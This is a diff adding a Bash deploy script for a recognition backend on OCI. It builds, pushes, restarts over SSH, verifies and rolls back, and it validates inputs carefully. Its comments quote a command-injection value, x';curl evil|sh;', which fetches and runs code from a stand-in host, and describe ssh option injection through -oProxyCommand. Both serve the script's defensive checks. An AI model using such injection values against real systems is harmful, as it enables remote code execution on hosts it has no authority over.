@@ -1,0 +1,6646 @@
+#!/usr/bin/env bash
+# Recognition service deploy automation for OCI.
+#
+# Wraps the build -> push -> ssh restart -> verify procedure documented in
+# infra/oci/README.md into one command per environment, with pre-flight checks
+# that catch the common foot-guns:
+#   - docker daemon not running (local build mode)
+#   - OCIR auth token missing/expired (local or remote)
+#   - SSH key not loaded / public-IP allowlist drift
+#   - HEAD diverged from origin/main (staging/prod only; skipped for dev + dev-fir)
+#   - dirty deploy inputs: apps/prototype-description-service, scripts/deploy
+#     (overridable for dev/dev-fir, blocked for staging/prod)
+#
+# Subcommands:
+#   build          [tag]              Build :SHA + :tag locally (no push). tag default = dev.
+#   build-remote   [tag]              Build immutable :SHA on the OCI VM (no local docker).
+#   deploy <env>                      Build + push :SHA + :ENV_TAG + ssh restart + verify.
+#                                       env = dev|dev-fir|staging|prod. 'deploy prod' requires CONFIRM=PROMOTE.
+#                                       dev-fir uses the :dev-fir image tag (isolated runtime and image).
+#   promote <from> <to>               Retag :FROM_TAG -> :TO_TAG on OCIR + restart + verify.
+#                                       e.g. promote dev staging, promote staging prod (CONFIRM=PROMOTE),
+#                                       promote staging dev, promote dev dev-fir (reset FIR to current :dev).
+#                                       promote requires the source image's commit to equal DEPLOY_SHA (use GIT_REF=<sha> to promote an older release).
+#   rollback <env> <id>                Restore registry/VM env tag from rollback-<12-char-digest-id>,
+#                                       restore compose/unit/edge .bak topology, restart, and verify.
+#                                       prod requires CONFIRM=PROMOTE.
+#   verify         <env>              Compare /health and the running image to the VM release receipt.
+#                                       Retries transient probe failures up to ACX_VERIFY_ATTEMPTS; a SHA mismatch is terminal.
+#                                       Expected image repo prefers remote .env ACX_IMAGE_REPO (so
+#                                       standalone verify of a VLM deploy works without re-exporting
+#                                       ACX_BUILD_TARGET). After deploy/promote, ACX_VERIFY_OPTIONAL=1
+#                                       downgrades a failed verify to a warning (does not exit).
+#   sync-runtime <env>               Sync topology for the receipted source/digest, then restart and verify.
+#   status                            Snapshot /health for all exact generic, FIR and Aura targets.
+#   gpu-lifecycle                     Install and verify the acx-gpu-start/reap timers when
+#                                       ACX_DEPLOY_GPU_LIFECYCLE=1. Requires ACX_GPU_READY_URL.
+#   prepare-producer <env>            First-producer bootstrap: same selected-env ship as
+#                                       deploy (CONFIRM=PROMOTE on prod, preserve, build/push,
+#                                       promote_gate smoke, digest-pinned restart), then
+#                                       image + scoped describe-load writer/schema/freshness.
+#                                       Does not call aggregate GPU snapshot verify; later
+#                                       `verify` / deploy still require the registry-wide gate.
+#   clear-image-repo <env>            Remove ACX_IMAGE_REPO from the remote env .env so compose falls
+#                                       back to the recognition default (${OCIR}/.../acx-backend).
+#                                       Use this to roll back sticky VLM/variant repo state after a
+#                                       promote to recognition, or to undo a bad ship. Does not restart.
+#   reset          <env>              Destructive: stop unit, clear env Postgres state, restart, verify
+#                                       /ready, run post-reset bootstrap (tenant + api_key creation).
+#                                       Requires CONFIRM_REMOTE_RESET=RESET and ACX_RESET_SITE_URL.
+#                                       'reset prod' also requires CONFIRM=PROMOTE.
+#
+# Set REMOTE_BUILD=1 (or env ACX_REMOTE_BUILD=1) to make 'deploy' / 'promote' build/retag
+# on the OCI VM via SSH+rsync instead of locally. Removes the colima/Docker-Desktop
+# dependency entirely; build runs natively on linux/arm64 (no cross-compile).
+#
+# Environment overrides:
+#   OCI_HOST                 default acx-backend.tail1a44b8.ts.net  (Tailscale MagicDNS)
+#                              override to the public IP if the tailnet is unavailable
+#   OCI_USER                 default ubuntu
+#   OCIR_REGISTRY            default iad.ocir.io
+#   OCIR_NAMESPACE           default idu2kqqe2jxy
+#   IMAGE_NAME               default acx-backend
+#   GIT_REF                  resolved once to DEPLOY_SHA at start; default HEAD
+#   ACX_DEPLOY_PLATFORM      default linux/arm64 (matches A1 Always Free shape; ignored in remote-build)
+#   ACX_REMOTE_BUILD         set to 1 to build on the VM instead of locally
+#   ACX_REMOTE_BUILD_DIR     default /tmp/acx-build  (rsync target on the VM)
+#   ACX_REMOTE_BUILD_GENERATION_TTL_MINUTES default 360 (stale generation age; must exceed 240
+#                              (twice the 7200 s build ceiling); smaller values disable the reaper)
+#   ACX_REMOTE_BUILDER_NAME  default acx-deploy-builder-v1 (stable docker-container builder)
+#   ACX_REMOTE_BUILDER_NODE  default acx-deploy-builder-v1-node (single explicit node)
+#   ACX_REMOTE_BUILDER_ENDPOINT
+#                            default unix:///var/run/docker.sock; other endpoints are refused
+#   ACX_ALLOW_DIRTY          set to 1 to allow dirty deploy inputs (dev and dev-fir only)
+#   ACX_ENV_PREFLIGHT        default 1; 0 skips manifest drift check
+#                            (materialize_remote.sh <env> <target> --check) before deploy and promote
+#   ACX_CUTOVER_HEALTH_ATTEMPTS default 5 (max 60); ACX_CUTOVER_HEALTH_SLEEP default 5 seconds (max 120 s) (candidate admission)
+#   ACX_CANONICAL_HEALTH_ATTEMPTS default 8 (max 60); ACX_CANONICAL_HEALTH_SLEEP default 5 seconds (max 120 s) (restart readiness)
+#   ACX_VERIFY_ATTEMPTS      default 5 (max 60) (post-deploy public verify only)
+#   ACX_VERIFY_SLEEP         default 5 (max 120 s) (seconds between post-deploy public verify attempts)
+#   ACX_ROLLBACK_VERIFY_ATTEMPTS default 5 (max 60); ACX_ROLLBACK_VERIFY_SLEEP default 5 seconds (max 120 s) (rollback verify)
+#   ACX_GPU_SNAPSHOT_GATE_ATTEMPTS default 3 (max 60); ACX_GPU_SNAPSHOT_GATE_SLEEP default 5 seconds (max 120 s) (GPU snapshot gate)
+#   ACX_VERIFY_OPTIONAL      set to 1 to downgrade verify failure from fail to warn after deploy/promote
+#   ACX_DEPLOY_GPU_LIFECYCLE default 0: explicit gpu-lifecycle exits 2 unless set to 1
+#   ACX_GPU_READY_URL        required when ACX_DEPLOY_GPU_LIFECYCLE=1; no production default
+#   ACX_GPU_LIFECYCLE_DRY_RUN set to 1 to render the installer plan without ssh/scp
+#   ACX_CONVERGE_RUNTIME     default 1: 'deploy' converges the deployed compose+unit with the repo
+#                              before additive-then-flip cutover. Set 0 for an image-only hotfix
+#                              that still starts a next unit and flips Caddy. Use
+#                              'deploy <env> --check' for a read-only drift report (no mutation).
+#   ACX_BOOT_SMOKE           default 1: 'deploy' boots the freshly-built :SHA in a throwaway
+#                              container (import smoke + /health probe) before promoting/restarting,
+#                              aborting on failure with prod untouched. Set 0 to bypass.
+#   ACX_EDGE_APPLY           default 0: when the shared Caddy edge has drifted, behaviour is
+#                              env-scoped — dev-fir fails closed (the edge IS fir's ingress);
+#                              any other env warns and skips edge convergence so that env's
+#                              own runtime still converges. Set 1 to explicitly allow the
+#                              edge ship + reload/recreate from any env (applying may
+#                              reload/recreate the prod-serving edge).
+#   ACX_BUILD_TARGET         optional docker build --target (e.g. runtime-vlm). Empty = last stage
+#                              (runtime). Charset-validated: ^[A-Za-z0-9_.-]+$ (empty allowed). Rejected
+#                              values never reach ssh/shell interpolation (D1). Remote builds select a
+#                              larger free-space floor for any target matching *vlm* (runtime-vlm,
+#                              builder-vlm, …) before multi-GB torch layers are downloaded. Also selects
+#                              the image repository name (RA-07):
+#                              empty/runtime → IMAGE_NAME (default acx-backend); runtime-vlm →
+#                              IMAGE_NAME-vlm. That same name is exported as ACX_IMAGE_REPO for compose.
+#   ACX_IMAGE_VARIANT        optional variant label (recognition|vlm). Folded into resolve_image_repo_name
+#                              and FAIL-CLOSED: ACX_IMAGE_VARIANT=vlm is refused unless ACX_BUILD_TARGET
+#                              matches *vlm*. Sibling lane bakes /app/.image-variant inside the image.
+#   ACX_SMOKE_TIMEOUT        positive integer seconds for Gate 2 /health budget (do_boot_smoke).
+#                              Default 24 for recognition; longer UNVALIDATED default (120s) when the
+#                              VLM target/variant is selected. Override this env var to raise the
+#                              budget; replace the default once a real arm64 VLM smoke is measured.
+#   ACX_PUSH_TIMEOUT         positive integer wall-clock seconds for each registry push (default 900).
+#   ACX_PULL_TIMEOUT         positive integer wall-clock seconds for each registry pull (default 900).
+#   ACX_REMOTE_COMMAND_TIMEOUT positive integer wall-clock seconds for ordinary remote calls (default 120).
+#   ACX_DEPLOY_LOCK_TTL_SECONDS unset/empty defaults to max(7200, computed floor) for acquire/renew;
+#                              release defaults to 7200. Explicit values must be at least max(600,
+#                              3 × max(ACX_PUSH_TIMEOUT, ACX_PULL_TIMEOUT) + restart health budgets
+#                              + ACX_GPU_SNAPSHOT_GATE attempts×sleep + one ACX_VERIFY_SLEEP + 300
+#                              + ACX_REMOTE_BUILD_TIMEOUT when shipping a remote build).
+#   ACX_DEPLOY_LOCK_BREAK      transaction id whose environment lease may be broken (break-glass; use with care).
+#   ACX_EVIDENCE_TIMEOUT     positive integer wall-clock seconds for capture_failure_evidence
+#                              probes (default 30). Decoupled from ACX_REMOTE_COMMAND_TIMEOUT so
+#                              raising the pull/restart knob does not stretch the pre-rollback
+#                              outage window.
+#   ACX_REMOTE_BUILD_TIMEOUT positive integer wall-clock seconds for remote rsync/BuildKit setup,
+#                              bootstrap, prune, and build work (default 1800; max 7200; one shared budget).
+#   CONFIRM                  required for prod actions: CONFIRM=PROMOTE (applies to deploy prod and promote * prod)
+#
+# Image variants / rollback (RA-07):
+#   Build targets produce distinct repository names so variants never clobber each other:
+#     empty / runtime  →  ${OCIR}/${NS}/${IMAGE_NAME}       (default acx-backend)
+#     runtime-vlm      →  ${OCIR}/${NS}/${IMAGE_NAME}-vlm   (default acx-backend-vlm)
+#   Greppable from the host alone:  docker images | grep -E 'acx-backend(-vlm)?'
+#   Identify a running container's variant (Dockerfile ENV, owned by ol01-img):
+#     docker inspect <container> --format '{{range .Config.Env}}{{println .}}{{end}}' \
+#       | grep '^ACX_IMAGE_VARIANT='
+#     # recognition → ACX_IMAGE_VARIANT=recognition ; VLM → ACX_IMAGE_VARIANT=vlm
+#   Rollback TO that variant's previous tag:
+#     recognition:  ${OCIR}/.../acx-backend:rollback-<id>  (or :staging / :latest)
+#     VLM:          ${OCIR}/.../acx-backend-vlm:rollback-<id>  (set ACX_BUILD_TARGET=runtime-vlm
+#                   so this script's IMAGE_BASE resolves to the -vlm repository)
+#   Sticky ACX_IMAGE_REPO on the VM drives compose forever once shipped. To reset back to the
+#   compose recognition default (remove the key from remote .env):
+#     $0 clear-image-repo <env>
+#     # or: make deploy-clear-image-repo ENV=<env>
+#
+# Reset-specific environment overrides (see do_reset()):
+#   ACX_RESET_SITE_URL       REQUIRED for reset. WordPress site URL the plugin will hit
+#                              (e.g. http://localhost:10010 for LocalWP). The bootstrap derives the
+#                              per-site tenant UUID from this value via
+#                              scripts/deploy/_derive_tenant_id.py (mirror of
+#                              TenantIdentity::derive_from_site_url()). If the URL does
+#                              not match the plugin's site URL, recognition requests fail
+#                              with 403 tenant mismatch.
+#   ACX_RESET_TENANT_ID      Optional explicit override. Skips per-site derivation; rare.
+#   ACX_RESET_DRY_RUN        set to 1 to print the reset plan and exit without executing.
+#   CONFIRM_REMOTE_RESET     required for reset: CONFIRM_REMOTE_RESET=RESET (fail-closed gate).
+set -euo pipefail
+
+OCI_HOST="${OCI_HOST:-acx-backend.tail1a44b8.ts.net}"
+OCI_USER="${OCI_USER:-ubuntu}"
+OCIR_REGISTRY="${OCIR_REGISTRY:-iad.ocir.io}"
+OCIR_NAMESPACE="${OCIR_NAMESPACE:-idu2kqqe2jxy}"
+IMAGE_NAME="${IMAGE_NAME:-acx-backend}"
+GIT_REF_EXPLICIT=0
+if [[ -n "${GIT_REF:-}" ]]; then GIT_REF_EXPLICIT=1; fi
+GIT_REF="${GIT_REF:-HEAD}"
+PLATFORM="${ACX_DEPLOY_PLATFORM:-linux/arm64}"
+REMOTE_BUILD="${REMOTE_BUILD:-${ACX_REMOTE_BUILD:-0}}"
+REMOTE_BUILD_DIR="${ACX_REMOTE_BUILD_DIR:-/tmp/acx-build}"
+REMOTE_BUILDER_NAME="${ACX_REMOTE_BUILDER_NAME:-acx-deploy-builder-v1}"
+REMOTE_BUILDER_NODE="${ACX_REMOTE_BUILDER_NODE:-acx-deploy-builder-v1-node}"
+REMOTE_BUILDER_ENDPOINT="${ACX_REMOTE_BUILDER_ENDPOINT:-unix:///var/run/docker.sock}"
+REMOTE_BUILD_LOCK="${REMOTE_BUILD_DIR}.lock"
+readonly REMOTE_BUILD_TIMEOUT_CEILING=7200
+# Optional docker build --target. Empty means BuildKit's default (last stage = runtime).
+# This is the plumbing the script would pass as `docker build --target ...`; there was no
+# prior target notion in this file — introduce it only as the explicit opt-in for VLM/etc.
+# Case-normalised at ingestion (D8); Docker --target match is case-insensitive so mixed-case targets
+# take the same variant-aware remote free-space gate.
+ACX_BUILD_TARGET="${ACX_BUILD_TARGET:-}"
+ACX_IMAGE_VARIANT="${ACX_IMAGE_VARIANT:-}"
+# Lower-case once at ingestion so enum + D8 + remote free-space selection see a single form.
+ACX_BUILD_TARGET="$(printf '%s' "${ACX_BUILD_TARGET}" | tr '[:upper:]' '[:lower:]')"
+ACX_IMAGE_VARIANT="$(printf '%s' "${ACX_IMAGE_VARIANT}" | tr '[:upper:]' '[:lower:]')"
+
+# Pre-build free-space floor on the remote docker data root (GB).
+# Justification (not a round guess): torch-free recognition image is ~1.1GB today; a single
+# remote build leaves multi-GB BuildKit intermediate layers; README/OPS-1 already document
+# disk fill on the Always Free A1. Budget = ~2× image + ~4GB cache headroom + ~2GB for
+# concurrent container layers/logs ≈ 8GB.
+REMOTE_BUILD_MIN_FREE_GB=8
+# Measured runtime-vlm build: 3.56GB image + ~12.9GB BuildKit cache + ~7.5GB headroom = 24GB.
+REMOTE_VLM_BUILD_MIN_FREE_GB=24
+
+# Boot-smoke Gate 2 /health budget defaults (seconds). Recognition keeps the
+# historical 24s health budget sized for the ~1.1GB torch-free image on 4-core
+# Ampere A1. Postgres pull/ready is budgeted separately so the pg_isready wait
+# cannot consume the /health deadline. Health attempts skip the last sleep and
+# reserve one poll interval for last-body + docker logs (EXIT trap) so a
+# deadline kill still emits the 503 body.
+# VLM default is an UNMEASURED estimate — no VLM image has ever been built or booted in
+# this repo; replace with a measured figure once a real smoke run exists.
+SMOKE_TIMEOUT_DEFAULT=24
+SMOKE_TIMEOUT_VLM_DEFAULT=120
+SMOKE_PG_READY_TIMEOUT=30
+# Wall-clock slack for network create + two docker runs + port publish, outside
+# the pg ready-wait and /health budgets. Pre-pull of pgvector is a separate
+# run_with_deadline so image fetch cannot steal those budgets.
+SMOKE_SETUP_SLACK=30
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
+# OCIR credential resolution (Vault-backed, OCIRV-1). Sourced rather than
+# inlined so scripts/deploy/tests/test-ocir-auth.sh can pin its invariants.
+# shellcheck source=lib/ocir-auth.sh
+source "${SCRIPT_DIR}/lib/ocir-auth.sh"
+# shellcheck source=lib/bounded-remote-build.sh
+source "${SCRIPT_DIR}/lib/bounded-remote-build.sh"
+SERVICE_DIR="${REPO_ROOT}/apps/prototype-description-service"
+DEPLOY_SNAPSHOT_DIR=""
+DEPLOY_ASSETS_DIR="${SCRIPT_DIR}"
+# Display label only. Live ssh invocations use `-l "${OCI_USER}" -- "${OCI_HOST}"`
+# so a leading-dash identity can never be parsed as an ssh option (S2-A-12).
+SSH_TARGET="${OCI_USER}@${OCI_HOST}"
+
+GREEN=$'\033[0;32m'
+YELLOW=$'\033[0;33m'
+RED=$'\033[0;31m'
+RESET=$'\033[0m'
+
+log() { printf '%s==>%s %s\n' "${GREEN}" "${RESET}" "$*"; }
+warn() { printf '%s!!%s %s\n' "${YELLOW}" "${RESET}" "$*" >&2; }
+fail() {
+  printf '%sxx%s %s\n' "${RED}" "${RESET}" "$*" >&2
+  exit 1
+}
+
+# A deploy/login owns one private Docker credential directory for its complete
+# lifetime. The path remains a shell-local value: only the exact Docker/login
+# subprocesses that need registry credentials receive it in their environment.
+ACX_DEPLOY_OCIR_CONFIG_DIR=""
+ACX_DEPLOY_OCIR_REMOTE_CONFIG=0
+ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=0
+ACX_CANDIDATE_DIGEST_REF=""
+ACX_ROLLBACK_DIGEST_REF=""
+ACX_ROLLBACK_IMAGE_BASE=""
+ACX_ROLLBACK_TAG=""
+ACX_PRIOR_IMAGE_ID=""
+ACX_PRIOR_RUNTIME_IDENTITY=""
+ACX_REMOTE_BUILD_GENERATION_DIR=""
+ACX_RESTART_EVIDENCE_PHASE=""
+ACX_TRAFFIC_FLIPPED=0
+ACX_EDGE_HANDLE=""
+ACX_EDGE_ENV=""
+ACX_CUTOVER_ENV=""
+ACX_CUTOVER_COMMITTED=0
+ACX_ENV_TAG_LOCK_HELD=""
+ACX_LIVE_DISRUPTED=0
+# Transaction phase values: "" (nothing to compensate), repo_shipped,
+# tag_promoted, restarted, compensating.
+ACX_DEPLOY_ENV=""
+ACX_DEPLOY_PHASE=""
+ACX_DEPLOY_LEASE_ENV=""
+ACX_DEPLOY_LEASE_LAST_HOLDER=""
+# Defer signal cleanup across tag promotion until its caller records the result.
+ACX_DEPLOY_TAG_PUSH_ACTIVE=0
+ACX_DEPLOY_PENDING_INTERRUPT=""
+# One deploy transaction owns one immutable remote topology snapshot. The
+# value is intentionally a narrow token because it is interpolated into paths
+# in remote shell commands; a caller may provide it when a higher-level retry
+# must resume the same transaction.
+ACX_DEPLOY_TRANSACTION_ID="${ACX_DEPLOY_TRANSACTION_ID:-$(date +%s)-$$}"
+if [[ ! "${ACX_DEPLOY_TRANSACTION_ID}" =~ ^[A-Za-z0-9_.-]+$ ]]; then
+  fail "ACX_DEPLOY_TRANSACTION_ID failed charset validation; refusing unsafe remote snapshot path"
+fi
+ACX_DEPLOY_BACKUP_ROOT="/opt/acx-backend/.acx-deploy-backups"
+
+# Quote one argument for the remote bash command string.  OpenSSH concatenates
+# argv into a command string, so passing a local argv element is not itself a
+# quoting boundary.  Every caller-controlled value in a remote command goes
+# through this helper after its own semantic validation.
+remote_quote() {
+  printf '%q' "$1"
+}
+
+validate_deploy_tmpdir() {
+  local value="${TMPDIR:-/tmp}"
+  if [[ "${value}" != /* || ! -d "${value}" || ! "${value}" =~ ^/[A-Za-z0-9_./-]+$ ]]; then
+    fail "TMPDIR must be an existing absolute directory using only [A-Za-z0-9_./-]; refusing unsafe value: ${value}"
+  fi
+}
+validate_deploy_tmpdir
+
+_purge_deploy_ocir_docker_config() {
+  local config_dir="${ACX_DEPLOY_OCIR_CONFIG_DIR:-}" config_q remote_dir
+  if [[ -n "${config_dir}" ]]; then
+    if [[ "${ACX_DEPLOY_OCIR_REMOTE_CONFIG:-0}" == "1" ]]; then
+      if ! remote_dir="$(remote_ocir_config_dir)"; then
+        warn "Skipping remote OCIR credential cleanup for unrecognized dir ${config_dir}; the remote expiry reaper remains armed"
+      else
+        config_q="$(remote_quote "${remote_dir}")"
+        if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -o ConnectionAttempts=1 \
+          -o ServerAliveInterval=2 -o ServerAliveCountMax=2 \
+          -l "${OCI_USER}" -- "${OCI_HOST}" \
+          "rm -rf -- ${config_q}" >/dev/null; then
+          warn "Remote OCIR credential cleanup failed for ${remote_dir}; the remote expiry reaper remains armed"
+        fi
+      fi
+    fi
+    rm -rf -- "${config_dir}"
+  fi
+  ACX_DEPLOY_OCIR_CONFIG_DIR=""
+  ACX_DEPLOY_OCIR_REMOTE_CONFIG=0
+  ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=0
+  unset ACX_OCIR_DOCKER_CONFIG_DIR DOCKER_CONFIG
+}
+
+_purge_deploy_snapshot() {
+  local snapshot_dir="${DEPLOY_SNAPSHOT_DIR:-}"
+  case "${snapshot_dir}" in
+    "${TMPDIR:-/tmp}"/acx-deploy-src.*) rm -rf -- "${snapshot_dir}" ;;
+  esac
+  DEPLOY_SNAPSHOT_DIR=""
+  DEPLOY_ASSETS_DIR="${SCRIPT_DIR}"
+}
+
+cleanup_deploy_ocir_docker_config() {
+  local rc=$?
+  trap - EXIT HUP INT TERM
+  _purge_deploy_ocir_docker_config
+  _purge_deploy_snapshot
+  return "${rc}"
+}
+
+skip_compensation_after_lease_loss() {
+  local env="$1"
+  ACX_DEPLOY_PHASE=""
+  ACX_DEPLOY_LEASE_ENV=""
+  warn "deploy lease for ${env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; skipping compensation. Inspect: $(rollback_command_hint "${env}")"
+}
+
+compensate_interrupted_deploy() {
+  local phase="${ACX_DEPLOY_PHASE:-}"
+  ACX_DEPLOY_PHASE=""
+  local env="${ACX_DEPLOY_ENV:-}" rollback_status=0
+
+  case "${phase}" in
+    "")
+      return 0
+      ;;
+    repo_shipped)
+      if ! deploy_env_lease renew "${env}"; then
+        skip_compensation_after_lease_loss "${env}"
+        return 1
+      fi
+      log "Interrupted deploy of ${env} at phase ${phase}; compensating"
+      restore_runtime_topology "${env}" current-only || rollback_status=$?
+      recognition_edge_assert_if_active || return 75
+      restore_prior_image_repo_env || return $?
+      return "$rollback_status"
+      ;;
+    tag_promoted)
+      if [[ "${ACX_LIVE_DISRUPTED:-0}" == "1" || "${ACX_TRAFFIC_FLIPPED:-0}" == "1" ]]; then
+        warn "INTERRUPTED: ${env} runtime was disrupted mid-cutover; not rolling back from a signal handler. Recovery: $(rollback_command_hint "${env}")"
+        return 1
+      fi
+      if ! deploy_env_lease renew "${env}"; then
+        skip_compensation_after_lease_loss "${env}"
+        return 1
+      fi
+      log "Interrupted deploy of ${env} at phase ${phase}; compensating"
+      if restore_env_tag_to_rollback "${env}" 0; then
+        rollback_status=0
+      else
+        rollback_status=$?
+        warn "automatic env-tag restore failed; refusing further runtime compensation; run: $(rollback_command_hint "${env}")"
+      fi
+      if ((rollback_status != 75)); then
+        restore_prior_image_repo_env || warn "prior sticky repository restore failed"
+      fi
+      ;;
+    restarted)
+      warn "INTERRUPTED before verify completed: ${env} serves unverified ${ACX_CANDIDATE_DIGEST_REF}. Verify: make deploy-verify-${env} / rollback: $(rollback_command_hint "${env}")"
+      ;;
+    compensating)
+      warn "INTERRUPTED during rollback of ${env}; state unknown. Recovery: $(rollback_command_hint "${env}")"
+      ;;
+    *)
+      warn "INTERRUPTED with unknown deploy phase ${phase} for ${env}; state unknown. Recovery: $(rollback_command_hint "${env}")"
+      return 1
+      ;;
+  esac
+}
+
+deploy_interrupt_cleanup() {
+  local requested="${1-}"
+  local rc=$?
+  if [[ -n "${requested}" && "${ACX_DEPLOY_TAG_PUSH_ACTIVE:-0}" == "1" ]]; then
+    ACX_DEPLOY_PENDING_INTERRUPT="${requested}"
+    return 0
+  fi
+  trap - EXIT HUP INT TERM
+  if [[ -n "${requested}" ]]; then
+    rc="${requested}"
+  fi
+  recover_interrupted_cutover || true
+  cleanup_remote_build_generation_on_exit || true
+  compensate_interrupted_deploy || true
+  if [[ -n "${ACX_DEPLOY_LEASE_ENV:-}" ]]; then
+    local lease_env="${ACX_DEPLOY_LEASE_ENV}"
+    deploy_env_lease release "${lease_env}" || warn "deploy lease for ${lease_env} not released; it expires at its TTL"
+  fi
+  recognition_edge_release || {
+    warn "shared edge release failed; journal retained"
+    ((rc != 0)) || rc=1
+  }
+  _purge_deploy_ocir_docker_config
+  _purge_deploy_snapshot
+  if [[ -n "${requested}" ]]; then
+    exit "${rc}"
+  fi
+  return "${rc}"
+}
+
+install_deploy_interrupt_traps() {
+  trap deploy_interrupt_cleanup EXIT
+  trap 'deploy_interrupt_cleanup 129' HUP
+  trap 'deploy_interrupt_cleanup 130' INT
+  trap 'deploy_interrupt_cleanup 143' TERM
+}
+
+init_deploy_ocir_docker_config() {
+  if [[ -n "${ACX_DEPLOY_OCIR_CONFIG_DIR}" ]]; then
+    return 0
+  fi
+  validate_deploy_tmpdir
+  ACX_DEPLOY_OCIR_CONFIG_DIR="$(mktemp -d "${TMPDIR:-/tmp}/acx-ocir-deploy.XXXXXX")" ||
+    fail "Could not create the deploy-scoped Docker credential directory"
+  ACX_OCIR_DOCKER_CONFIG_DIR="${ACX_DEPLOY_OCIR_CONFIG_DIR}"
+  DOCKER_CONFIG="${ACX_DEPLOY_OCIR_CONFIG_DIR}"
+  install_deploy_interrupt_traps
+}
+
+# The local dir lives under the laptop's TMPDIR (macOS: /var/folders/...), which does not
+# exist on the VM. The remote copy shares only the random mktemp suffix, under /tmp.
+# Returns 1 unless the local dir is a real mktemp result, so no caller can ever
+# hand the VM a bare /tmp/ (DOCKER_CONFIG or rm -rf target). Check the status:
+# fail inside $(...) only exits the subshell.
+remote_ocir_config_dir() {
+  local base="${ACX_DEPLOY_OCIR_CONFIG_DIR##*/}"
+  [[ "${base}" =~ ^[A-Za-z0-9_][A-Za-z0-9._-]*$ ]] || return 1
+  printf '/tmp/%s\n' "${base}"
+}
+
+init_remote_ocir_docker_config() {
+  init_deploy_ocir_docker_config
+  if [[ "${ACX_DEPLOY_OCIR_REMOTE_CONFIG}" == "1" ]]; then
+    return 0
+  fi
+  # Arm cleanup before the create attempt: ssh may create the directory and
+  # still return non-zero (for example, if a following chmod fails).
+  local config_q ttl ttl_q remote_dir
+  ttl="${ACX_OCIR_REMOTE_CONFIG_TTL:-3600}"
+  if [[ ! "${ttl}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_OCIR_REMOTE_CONFIG_TTL must be a positive integer (got: ${ttl})"
+  fi
+  remote_dir="$(remote_ocir_config_dir)" || fail "Remote OCIR credential dir is not initialized"
+  config_q="$(remote_quote "${remote_dir}")"
+  ttl_q="$(remote_quote "${ttl}")"
+  ACX_DEPLOY_OCIR_REMOTE_CONFIG=1
+  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "umask 077; config=${config_q}; if [ -L \"\$config\" ]; then exit 1; fi; if [ ! -d \"\$config\" ]; then mkdir -p -- \"\$config\"; fi; chmod 700 \"\$config\"; nohup bash -c 'sleep \"\$1\"; rm -rf -- \"\$2\"' acx-ocir-reaper ${ttl_q} \"\$config\" >/dev/null 2>&1 </dev/null &"; then
+    fail "Could not create remote deploy-scoped Docker credential directory on ${SSH_TARGET}"
+  fi
+}
+
+# D1: refuse shell/ssh metacharacters before any remote interpolation. Quoting is not enough —
+# a value like x';curl evil|sh;' closes a single-quoted ssh fragment and runs as ubuntu on the VM.
+# Allowlist: empty OR ^[A-Za-z0-9_./-]+$ (docker target / tag / short name / remote path safe set).
+# `/` is path-safe (not a shell metacharacter) so ACX_REMOTE_BUILD_DIR can share this gate.
+assert_safe_shell_token() {
+  local name="$1" value="$2"
+  if [[ -z "${value}" ]]; then
+    return 0
+  fi
+  if [[ ! "${value}" =~ ^[A-Za-z0-9_./-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: empty or [A-Za-z0-9_./-]+); refusing value that could reach a remote shell: ${value}"
+  fi
+}
+
+# S2-A-12: OCI_USER / OCI_HOST reach ssh argv. Leading '-' would be parsed as an option
+# (e.g. -oProxyCommand=…). Charset allowlist alone is not enough because '-' is admitted;
+# refuse leading dash and require a non-empty host/user.
+assert_safe_ssh_identity() {
+  local name="$1" value="$2"
+  if [[ -z "${value}" ]]; then
+    fail "${name} must not be empty"
+  fi
+  if [[ "${value}" == -* ]]; then
+    fail "${name} must not start with '-' (ssh option injection): ${value}"
+  fi
+  if [[ ! "${value}" =~ ^[A-Za-z0-9_.:-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:-]+); refusing: ${value}"
+  fi
+}
+assert_safe_ssh_identity "OCI_USER" "${OCI_USER}"
+assert_safe_ssh_identity "OCI_HOST" "${OCI_HOST}"
+
+# Full OCIR image repository path (registry/ns/name). No spaces, quotes, or shell metacharacters.
+assert_safe_image_repo() {
+  local name="$1" value="$2"
+  if [[ -z "${value}" ]]; then
+    fail "${name} must not be empty"
+  fi
+  if [[ ! "${value}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:/-]+); refusing: ${value}"
+  fi
+}
+
+assert_safe_image_ref() {
+  local name="$1" value="$2"
+  if [[ -z "${value}" || ! "${value}" =~ ^[A-Za-z0-9_.:/@-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:/@-]+); refusing: ${value:-empty}"
+  fi
+}
+
+# Reset-path site URL: allow typical URL charset; refuse shell metacharacters (;`$| etc.).
+# Regex must live in a variable: `#` would start a comment if written inline in [[ ]].
+assert_safe_reset_site_url() {
+  local value="$1"
+  local re='^[A-Za-z0-9_.:/@%?=&#+-]+$'
+  if [[ -z "${value}" ]]; then
+    fail "ACX_RESET_SITE_URL must not be empty"
+  fi
+  if [[ ! "${value}" =~ $re ]]; then
+    fail "ACX_RESET_SITE_URL failed charset validation (URL charset only); refusing value that could reach a remote shell: ${value}"
+  fi
+}
+
+# Validate operator-facing tokens at ingestion (before resolve / IMAGE_BASE / any ssh).
+assert_safe_shell_token "IMAGE_NAME" "${IMAGE_NAME}"
+assert_safe_shell_token "OCIR_NAMESPACE" "${OCIR_NAMESPACE}"
+assert_safe_shell_token "OCIR_REGISTRY" "${OCIR_REGISTRY}"
+assert_safe_shell_token "ACX_BUILD_TARGET" "${ACX_BUILD_TARGET}"
+assert_safe_shell_token "ACX_IMAGE_VARIANT" "${ACX_IMAGE_VARIANT}"
+if [[ ! "${REMOTE_BUILDER_NAME}" =~ ^[A-Za-z0-9_.-]+$ || "${REMOTE_BUILDER_NAME}" == -* ]]; then
+  fail "ACX_REMOTE_BUILDER_NAME must be a non-leading-dash [A-Za-z0-9_.-] token (got: ${REMOTE_BUILDER_NAME})"
+fi
